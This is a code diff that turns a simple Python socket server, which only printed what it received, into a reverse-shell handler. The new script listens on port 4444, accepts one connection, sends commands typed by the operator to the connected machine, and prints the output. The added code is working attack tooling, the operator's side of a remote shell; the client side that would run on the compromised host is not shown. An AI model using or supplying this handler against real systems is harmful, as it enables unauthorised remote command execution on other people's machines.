@@ -1,39 +1,26 @@
 import socket
-from colorama import Fore, Back, Style
 
-def server_start(host, port):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((host, port))
-        s.listen()
-        print()
-        print(Back.YELLOW,end="")
-        print(Fore.BLACK+"waiting for connection............... ",end="")
-        print(Style.RESET_ALL)
-        print()
-        conn, addr = s.accept()
-        with conn:
-            print(Fore.RED + ' Connected by: ', end="")
-            print(Back.GREEN + str(addr), end="")
-            print(Style.RESET_ALL)
 
-            while True:
-                data = conn.recv(1024).decode()
-                if not data:
-                    break
-                print(Back.MAGENTA, end="")
-                print(Fore.CYAN+data,end="")
-                print(Style.RESET_ALL)
+#creating socket object
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-    s.close()
-    conn.close()
+s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+# Binding server 
+s.bind(('0.0.0.0',4444))
+# Listening to 1 client
+s.listen(1)
 
-def requirement():
-	host = input("Enter Host: ")
-	port = int(input("Enter Port: "))
-	if port > 65535:
-		print("port number must be less than 65535")
-		return requirement()
-	return host, port
+# Accepting connection from client
+client,addr = s.accept()
+print("$ "+client.recv(4096).decode())
+while True:
+	cmd = input("$ ")
+	client.send(cmd.encode())
+	if cmd == "exit":
+		print("exiting out of shell \nConnection closed....")
+		break
+	print(client.recv(4096).decode())
 
-host, port = requirement()
-server_start(host, port)
+client.close()
+s.close()
+
